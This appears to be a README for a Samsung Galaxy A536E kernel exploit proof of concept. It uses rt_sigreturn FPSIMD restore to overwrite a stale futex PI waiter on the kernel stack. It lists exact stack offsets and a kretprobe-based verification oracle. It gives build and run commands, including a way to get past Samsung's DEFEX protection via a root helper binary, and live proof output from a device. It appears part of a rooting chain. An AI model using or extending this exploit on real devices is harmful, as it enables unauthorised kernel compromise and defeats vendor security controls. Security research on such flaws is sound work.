# rt_sigreturn FPSIMD writer PoC

This branch tests one A536E GZG3-specific kernel-stack writer. It does not
replace the stable clean root chain.

## Exact layout

The exact GZG3 `vmlinux.elf` gives these stack frames:

```text
futex_wait_requeue_pi waiter = syscall entry SP - 0x1e0
restore_fpsimd_context vregs = syscall entry SP - 0x2e0
waiter inside vregs           = vregs + 0x100
```

`restore_fpsimd_context` copies `0x200` bytes from the signal frame into its
local `vregs` buffer. The full `0x50`-byte `rt_mutex_waiter` is covered by
bytes `0x100..0x14f` of that copy.

The live oracle uses two probes. A probe on `rt_mutex_init_waiter` records the
real waiter pointer. A return probe on `__arch_copy_from_user` records the ten
qwords at kernel `SP+0x100` after the copy. A full valid result has both:

```text
waiter == restore_fpsimd_context SP + 0x100
q0..q9 == 0x465053494d440000..0x465053494d440009
```

The helper records into the isolated trace instance `rmg_fpsimd`. It does not
clear the global trace buffer or change global `tracing_on`, and cleanup
removes both probe events and the instance.

## Modes

- `frame`: safe control. It changes the normal signal FPSIMD record and exits
  after `rt_sigreturn`. It proves the 512-byte kernel-stack copy and the live
  kretprobe oracle.
- `ghostlock`: creates the stale PI waiter first, signals that same TID, then
  stays alive. It never calls `sched_setattr`. This is a crash-prone exploit
  test. Run it once on a known boot and reboot after capture.

Build:

```sh
make -C exploit out/fpsimd-writer-poc
```

Root is used only to install and read the kretprobe. The PoC itself runs as
the regular adb shell user.

Safe live check, with build, host/device SHA-256, probe setup, capture, and
cleanup:

```powershell
.\scripts\run-fpsimd-frame.ps1 -Serial DEVICE_SERIAL
```

Samsung DEFEX kills a root process that directly executes a script from
`/data/local/tmp`. Invoke the probe helper through the trusted system shell:

```sh
/data/local/tmp/cve-2026-43499-root -c \
  '/system/bin/sh /data/local/tmp/fpsimd-kprobe.sh setup'
```

## A536E live proof

On boot `22f64510-d8c8-4a96-b7ca-bae695310f8c`:

```text
rmg_waiter_init waiter=0xffffffc03047bc60
restore_fpsimd_context+0x338 sp=0xffffffc03047bb60
sp + 0x100 = 0xffffffc03047bc60
q0=0x465053494d440000 ... q9=0x465053494d440009
```

Both the real address overlap and the copied marker were observed. The device
was deliberately rebooted after the `ghostlock` capture to remove the stale
waiter; it did not reboot on its own during the test.
